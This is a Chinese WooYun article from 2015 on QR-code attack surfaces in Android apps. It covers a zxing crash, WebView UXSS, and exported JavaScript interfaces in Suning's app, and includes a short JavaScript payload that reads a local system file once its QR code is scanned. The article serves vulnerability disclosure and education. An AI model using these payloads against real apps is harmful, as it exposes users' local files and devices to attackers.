@@ -1,0 +1,34 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Android平台下二维码漏洞攻击杂谈</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">路人甲</a> <span class="bull">·</span> <time title="2015/12/02 12:42" ui-time="" datetime="2015/12/02 12:42" class="published ng-binding ng-isolate-scope">2015/12/02 12:42</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>现在Android App几乎都有二维码扫描功能，如果没有考虑到二维码可能存在的安全问题，将会导致扫描二维码就会受到漏洞攻击，严重的可能导致手机被控制，信息泄漏等风险。</p><h1>0x01 拒绝服务</h1><hr><p>低版本的zxing这个二维码库在处理畸形二维码时存在数组越界，导致拒绝服务。扫描下面的二维码，可能导致主程序崩溃：</p><p><img alt="p1" img-src="c9d4c2949e067f32323395daf0293e19892ea37d.jpg"></p><p>通过程序的崩溃日志可以看出是个数组越界：</p><pre><code>11-23 10:39:02.535: E/AndroidRuntime(1888): FATAL EXCEPTION: Thread-14396 
+11-23 10:39:02.535: E/AndroidRuntime(1888): Process: com.xxx, PID: 1888 
+11-23 10:39:02.535: E/AndroidRuntime(1888): java.lang.ArrayIndexOutOfBoundsException: length=9; index=9 
+11-23 10:39:02.535: E/AndroidRuntime(1888):   at com.google.zxing.common.BitSource.readBits(Unknown Source) 
+11-23 10:39:02.535: E/AndroidRuntime(1888):   at com.google.zxing.qrcode.decoder.DecodedBitStreamParser.decodeAlphanumericSegment(Unknown Source) 
+11-23 10:39:02.535: E/AndroidRuntime(1888):   at com.google.zxing.qrcode.decoder.DecodedBitStreamParser.decode(Unknown Source) 
+11-23 10:39:02.535: E/AndroidRuntime(1888):   at com.google.zxing.qrcode.decoder.Decoder.decode(Unknown Source) 
+11-23 10:39:02.535: E/AndroidRuntime(1888):   at com.google.zxing.qrcode.QRCodeReader.decode(Unknown Source) 
+11-23 10:39:02.535: E/AndroidRuntime(1888):   at com.google.zxing.MultiFormatReader.decodeInternal(Unknown Source) 
+11-23 10:39:02.535: E/AndroidRuntime(1888):   at com.google.zxing.MultiFormatReader.decodeWithState(Unknown Source) 
+</code></pre><h1>0x02 本地文件读取</h1><hr><p>之前Wooyun上爆了一个<a href="http://www.wooyun.org/bugs/wooyun-2010-09145">利用恶意二维码攻击快拍</a>的漏洞，识别出来的二维码默认以html形式展示(Android+Iphone)，可以执行html和js。将下面的js在cli.im网站上生成二维码：</p><pre><code>#!js
+&lt;script&gt;
+x=new XMLHttpRequest(); 
+if(x.overrideMimeType) 
+x.overrideMimeType('text/xml'); 
+x.open("GET", "file://///default.prop", false); 
+x.send(null); 
+alert(x.responseText); 
+&lt;/script&gt;
+</code></pre><p><img alt="p2" img-src="f5909f74c3f932b60dc59d150a0b5a19237c1c73.jpg"></p><p>用快拍扫描之后，就能读取本地文件内容：</p><p><img alt="p3" img-src="72d505e9cd26fa0e54ccfee28f6f6a3416cc8c57.jpg"></p><h1>0x03 UXSS</h1><hr><p>去年，Android平台上的Webview UXSS漏洞被吵的沸沸扬扬，由于低版本的Android系统自带的Webview组件使用Webkit作为内核，导致Webkit的历史漏洞就存在于Webview里面，其中就包括危害比较大的UXSS漏洞。</p><p>Webview组件几乎存在于所有Android App中，用来渲染网页。如果扫描二维码得到的结果是个网址，大部分App会直接用Webview来打开，由于Webview存在UXSS漏洞，很容易导致资金被窃、帐号被盗或者隐私泄露。漏洞介绍可参考TSRC博文：<a href="http://security.tencent.com/index.php/blog/msg/70">Android Webview UXSS 漏洞攻防</a></p><p><img alt="p4" img-src="d8a381411911607de56b833ae638910892cd8e49.jpg"></p><h1>0x04 远程命令执行</h1><hr><p>大部分Android App扫描二维码之后，如果识别到的二维码内容是个网址时，会直接调用Webview来进行展示。如果Webview导出了js接口，并且targetSDK是在17以下，就会受到远程命令执行漏洞攻击风险。</p><p>苏宁易购Android版扫描二维码会用Webview打开网页，由于苏宁易购导出多个js接口，因此扫描二维码即会受到远程命令执行漏洞攻击（最新版本已修复）。</p><p><code>com.suning.mobile.ebuy.host.webview.WebViewActivity</code>导出多个js接口：</p><pre><code>#!java
+this.b(this.a);
+            this.s = this.findViewById(2131494713);
+            this.d = this.findViewById(2131494100);
+            this.d.a(((BaseFragmentActivity)this));
+            this.l = new SNNativeClientJsApi(this);
+            this.d.addJavascriptInterface(this.l, "client");
+            this.d.addJavascriptInterface(this.l, "SNNativeClient");
+            this.d.addJavascriptInterface(new YifubaoJSBridge(this), "YifubaoJSBridge");
+</code></pre><p>由于targetSDKversion为14，因此所有Android系统版本都受影响：</p><pre><code>&lt;uses-sdk
+android:minSdkVersion="8"
+android:targetSdkVersion="14"
+&gt;
+&lt;/uses-sdk&gt;
+</code></pre><p>苏宁易购Android版首页有个扫描二维码的功能：</p><p><img alt="p5" img-src="c9ed9cd432f92bb6d5f00f8fbded397fd2993a9d.jpg"></p><p>扫描二维码时，如果二维码是个网页链接，就会调用上面的Webview组件打开恶意网页：</p><p><img alt="p6" img-src="63a8a59655bc2f9dc7415b9fffc86fd8869a1610.jpg"></p><p>恶意二维码如下：</p><p><img alt="p7" img-src="77905edcc6e23e79f5725248d144bab0c99abcbf.jpg"></p><h1>0x05 总结</h1><hr><p>二维码可能攻击的点还不止上面列的那些，发散下思维，还有zip目录遍历导致的远程代码执行漏洞，还有sql注入漏洞，说不定还有缓冲区溢出漏洞。思想有多远，攻击面就有多宽！Have Fun！</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/2893" rel="bookmark" id="re1">Intent scheme URL attack</a></li><li><a href="http://drops.wooyun.org/mobile/8165" rel="bookmark" id="re2">Fragment Injection漏洞杂谈</a></li><li><a href="http://drops.wooyun.org/papers/548" rel="bookmark" id="re3">WebView中接口隐患与手机挂马利用</a></li><li><a href="http://drops.wooyun.org/papers/1440" rel="bookmark" id="re4">Android Adobe Reader 任意代码执行分析(附POC)</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hhi</span> <span class="reply-time">2015-12-03 08:22:26</span></div><p></p><p>很好，为什么不多写写细节呢</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">云之凡</span> <span class="reply-time">2015-12-02 15:39:29</span></div><p></p><p>思想有多远，攻击面就有多宽！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">隐形人真忙</span> <span class="reply-time">2015-12-02 13:13:34</span></div><p></p><p>好文 赞个</p><p></p></div></div></div></div></div></main>
